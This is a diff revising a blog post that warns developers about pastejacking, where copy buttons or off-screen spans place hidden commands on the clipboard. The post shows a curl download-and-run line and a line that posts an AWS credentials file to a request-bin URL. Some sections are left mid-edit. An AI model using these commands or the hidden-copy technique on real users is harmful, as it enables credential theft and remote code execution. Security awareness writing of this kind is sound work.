@@ -4,28 +4,30 @@ emoji: 🗒️
 asset: "/assets/posts/dont-trust-your-clipboard"
 ---
 
-Copying and pasting code from online seem innocuous at first and it is a practice all of us practice in every day when coding or debugging. We copy from online tutorials, Stack Overflow posts, READMEs, gists, blogs, and the list goes on. 
+One of the best things about the software profession is culture of knowledge sharing. You can find a solutions, manuals, tutorials, and blogs all over the internet which examples, commands and code snippets.
 
+At first glance, copying and pasting code from the internet appears innocuous and is a daily practice many of us. It's common to copy code from various online sources such as tutorials, Stack Overflow posts, READMEs, gists, blogs, and the like.
 
-Just like we get desensitized to the opening email attachment that could have malous indent coders are desensitized to how copying and pasting into our terminals could result in something much worst.
+Just as hackers exploit our desensitization to opening emails and clicking on links, programmers can also become accustomed to the potential risks of copying and pasting code into their terminals, which can lead to much more severe consequences.
 
-#### DISCLAIMER
-This post is about not being laissez faire copying and pasting text from the internet and this content is no expectation. For each method I provide a example showing the issue. If you still wish to copy the code yourself I can't stop you, but you have been warned. We will explore why I wrote this disclaimer latter on.
+**DISCLAIMER:** This post highlights the importance of being cautious when copying and pasting text from the internet, and the content below is no exception. While I cannot prevent you from copying the code yourself, I urge you to proceed with caution, as there may be risks involved. Later on, we will delve into the reasons why I felt the need to include this disclaimer.
 
-## Pasting Commands You Don't Understand
-
-I would hope most people, who code,  would understand this one. If you don't understand what a command is doing then don't run said command. The git gist by `frankbi` is one of my favorite examples of why you should not run copy and paste commands from websites.
+One of my favorite examples of why you should exercise caution when running copy and paste commands from websites is the git gist authored by `frankbi`.
 
 <div style="text-align: center;">
-    <img style="max-width: 100%;" src="{{ page.asset }}/rickrollbashcode.png">
-    <img style="max-width: 100%;" src="{{ page.asset }}/rickroll.gif"/>
+    <img style="max-width: 75%;" src="{{ page.asset }}/rickrollbashcode.png">
+    <br>
+    <img style="max-width: 75%;" src="{{ page.asset }}/rickroll.gif"/>
 </div>
 
-While this rickroll seems harmless the arbitrary execution of code on your computer is something that should always make you nervous.
+Although the rickroll itself may seem harmless, the fact that it involves arbitrary code execution on your computer is something that should always make you uneasy. Unfortunately, many project installation instructions are now utilizing similar commands such as `curl -L https://example.com/script.sh | bash` or `bash -c $(curl 0fsSL https://example.com/script.sh). One prominent example of this is Homebrew.`
 
-Unfortunately, more and more project install direction are following that `curl -L somescript.sh | bash` and in many cases require `sudo`. 
+#### [Install Homebrew - brew.sh](https://brew.sh/)
+<div style="text-align: center;">
+    <img style="max-width: 85%;" src="{{ page.asset }}/copy_select_brew.png">
+</div>
 
-EXAMPLES
+Arbitrary code execution is bad because it involves running code on your computer that you may not understand or trust. This can lead to serious security vulnerabilities or other consequences. With the understanding and concern associated with arbitrary code execution, let's examine the different methods of copying text, including copying via button and the traditional select, copy, and paste method.
 
 ## Copy Text Via Button
 
@@ -39,12 +41,6 @@ https://askubuntu.com/questions/377259/stop-terminal-auto-executing-when-pasting
     <img style="max-width: 80%;" src="{{ page.asset }}/copy_button_docs_aws.png">
 </div>
 
-#### [Getting Started: Install Nomad | hashicorp.com](https://learn.hashicorp.com/tutorials/nomad/get-started-install?in=nomad/get-started)
-
-<div style="text-align: center;">
-    <img style="max-width: 80%;" src="{{ page.asset }}/copy_button_hashicorp.png">
-</div>
-
 #### [pyenv/pyenv README| github.com](https://github.com/pyenv/pyenv)
 
 Github injects a copy button for all code block in READMEs.
@@ -53,8 +49,8 @@ Github injects a copy button for all code block in READMEs.
     <img style="max-width: 80%;" src="{{ page.asset }}/copy_button_github_readme.png">
 </div>
 
-The example above by themselves are not bad, but it does lead people into trusting the copy button has a reliable and safe method for getting commands from a website to a terminal window. What is missing is the understanding you are at the mercy of the website's code. Lets go to visit a sample blog post written by someone with nefarious intentions.
 
+The examples above are not inherently harmful, but they may lead individuals trust the copy button as a means of transferring commands from a website to a terminal. What's overlooked is that you are at the mercy of the website's code. Let's consider a scenario where we visit a blog post written by someone with malicious intent.
 
 <link rel="stylesheet" href="{{ page.asset }}/totallysafeandhelpful.css">
 
@@ -97,7 +93,7 @@ Oh `BadActor666` provides the Docker command I am looking for and I can easily c
 </div>
 
 
-You just got ghostbusted! Under the hood how this is accomplished is not complicated.
+You just got ghostbusted!
 
 The copy button called a javascript function.
 ```
@@ -123,7 +119,7 @@ curl -L https://nickstanley574.github.io{{ page.asset }}/ghostbusters \n
 
 Using `select()` plus `execCommand()` is the way most copy buttons on webpage work, just instead of adding a dummy element and text behind seen They select and copy the text from elements seen by the user, but the user is at the mercy of the copy function.
 
-## Normal Select, Copy & Paste
+## Select, Copy & Paste
 
 One of the best things about the software profession is culture of knowledge sharing. You can find a solutions, manuals, tutorials, and blogs all over the internet which examples, commands and code snippets. Simply selecting text, using right click or `ctrl + c` and then pasting should be safe right? 
 
@@ -141,19 +137,7 @@ Lets go back to Look at another post from  totally-safe-and-helpful.blog ...
   <br>
 </div>
 
-... seems safe enough. Looks like any other code snippet from any of the following websites and blogs.
-
-#### [Install Homebrew - brew.sh](https://brew.sh/)
-<div style="text-align: center;">
-    <img style="max-width: 85%;" src="{{ page.asset }}/copy_select_brew.png">
-</div>
-
-#### [Nginx Binary Releases - nginx.com](https://www.nginx.com/resources/wiki/start/topics/tutorials/install/)
-<div style="text-align: center;">
-    <img style="max-width: 85%;" src="{{ page.asset }}/copy_select_nginx.png">
-</div>
-
-You see where this is going. All aboard 🚂 !
+... seems safe enough. Looks like any other code snippet from any of the following websites and blogs. You can see where this is going. All aboard 🚂 !
 
 <div style="text-align: center;">
 <video style="max-width: 80%;"  controls>
@@ -182,7 +166,7 @@ This time `BadActor666` used a `<span>` tag inside of a `<div>`. A `<span>` tag 
 <p>Don't <b>ever</b> push the <b><span style="color:red">red</span> one</b>.</p>
 ```
 
-The `BadActor666` `<span>` contains the styling of `position: absolute; top: -200px; left: -200px;` which puts the text off screen in the upper left conner of the browser window. Even though you can't see it doesn't mean its not copied. When the `du` command is highlighted so is the text in the `<span>`. Here is what is copied to your clipboard.
+This allows us to add style to text, but browser allows the copy without the the format applied. The BadActor666 `<span>` contains the styling of `position: absolute; top: -200px; left: -200px;` which puts the text off screen in the upper left conner of the browser window. Even though you can't see it doesn't mean its not copied. When the `du` command is highlighted so is the text in the `<span>`. Here is what is copied to your clipboard.
 ```
 du -hs *; curl -s -L https://nickstanley574.github.io//assets/posts/dont-trust-your-clipboard/sl --output sl; chmod +x sl; ./sl; clear;
 du -hs * | sort -rh | head -5
@@ -191,6 +175,8 @@ du -hs * | sort -rh | head -5
 The curl downloads a file, makes it exactable, runs it.
 
 ## Composing the Attack
+
+### Attack Avenue 1
 
 Now the real danger is in the `sudo` command. The `sudo` command gives a user temporarily elevated privileges allowing the completion of tasks that require to be run as the root user.  Often sudo is used to install or update packages, i.e. `sudo apt-get install apache2` on.
 
@@ -213,19 +199,22 @@ Reading package lists... Done
 nick /home $
 ```
 
-Notice how for the second sudo command didn't require a password. Thats because sudo has a setting entitled, `timestamp_timeout` sets the number of minutes that can elapse before sudo will ask for a passwd again. This allow to run multiple sudo command in short pervious of time without needing to re-enter your password over and over again. By default is value is set to 5 minutes. This is where hackers can
+Notice how for the second sudo command didn't require a password. Thats because sudo has a setting entitled, `timestamp_timeout` sets the number of minutes that can elapse before sudo will ask for a passwd again. This allow to run multiple sudo command in short pervious of time without needing to re-enter your password over and over again. By default is value is set to 5 minutes. This is where hackers can take advantage. First, have a commands that are legit that require `sudo` access.
 
 ```
-
+sudo apt install -yq curl gnupg2 ca-certificates lsb-release
+sudo apt-get -yq update
+sudo apt install -yq nginx
+sudo systemctl start nginx
 ```
 
+This could result in malicious or spyware or ransomware being installed on a system.
 
+### Attack Avenue 2
 
+Wh
 
-### Social Engineering
-
-> Social engineering is the psychological manipulation of people into performing actions or divulging confidential information. All social engineering techniques are based on specific attributes of human decision-making known as cognitive biases.These biases, sometimes called "bugs in the human hardware", are exploited in various combinations to create attack techniques.
-
+#
 <!-- curl -s -d "$(cat ~/.aws/credentials_fake)" https://en2lx5n7b4y69.x.pipedream.net/ > /dev/null; top; exit-->
 
 Your user can access your data your don't need sudo/root.
@@ -265,43 +254,15 @@ function nefariousCopy2(n) {
 }
 </script>
 
-#### The Attack
 ```
-sudo apt install -yq curl gnupg2 ca-certificates lsb-release
-sudo apt-get -yq update
-sudo apt install -yq nginx
-sudo systemctl start nginx
+xclip -sel clip < /dev/null & curl -s -d "$(cat ~/.aws/credentials_fake)" https://en2lx5n7b4y69.x.pipedream.net/ > /dev/null & clear; top -d 0.25 -c & clear; kill -9 $$ 
 ```
 
-### Compromising a Blog, Website
+## Conclusion  
 
-#### The Attack
+When you use someone else's code or access a website, you are placing trust in them to ensure the security of their code and prevent unauthorized modifications. This is why I added the disclaimer. Do you know how strong my password is for my github? Do you know if I have MFA setup for my account? Do you know if I have given someone else access to the repo? 
 
+Another option is to prevent critical systems from having any type of access to the internet. Instead, make sure nothing can reach the internet and have dependencies, package repose and other resources be in some type of artifacts store. This way even if something malicious is copied there is no way to download from or upload to the internet. 
 
-## Why the Disclaimer?
-
-This could be a blog post by itself and it might be some day, but here is the cliff notes version. Like many apps, share library, blogs this sites code is in a GitHub repo. When using someone else code or viewing a website you are trusting them to secure there code and prevent others from making changes.
-
-Do you know how strong my password is for my github? Do you know if I have MFA setup for my account? Without that info you don't know how save the contents of this site are. It is conceivable that a bad actor could gain access to my github, make a change to one of my examples, and use my this to do exactly want I am describing.
-
-
-## What I do mitigate 
-
-To not copy from the internet would be crazy, but to mitigate the risk, I do not use the copy button, instead highlighting the command into a plaintext editor and reviewing the command before then pasting it into the terminal. It take a moment longer, but when working on systems that have access either my personal data or client data the extra time is worth it.
-
-
-## You Scared?
-
-### NO?
-You could argue I am being paranoid, and how often does this really happen. And you are missing the point. We should be doing thought experiments on how would you circumvent security or trick users because that is what keeps us vigilant. Plus it only take one miss step and you are the reason your company is compromised. Some paranoid is a good thing to have in the software discipline.
-
-If you trust a software to run your app you might trust that software's website security is to be trusted. 
-
-### Good! Now What?
-
-
-#### ZSH
-
-#### Tilix
-
+Where do we go from here? To not copy from the internet would be crazy, but to mitigate the risk, I do not directly copy and paste text into the terminal. Instead, I paste the text into a plaintext editor, review the command, and then paste or rewrite it into the terminal. It takes a bit longer, but when working on systems that have access to either my personal or client data, the extra time is worth the added security.
 
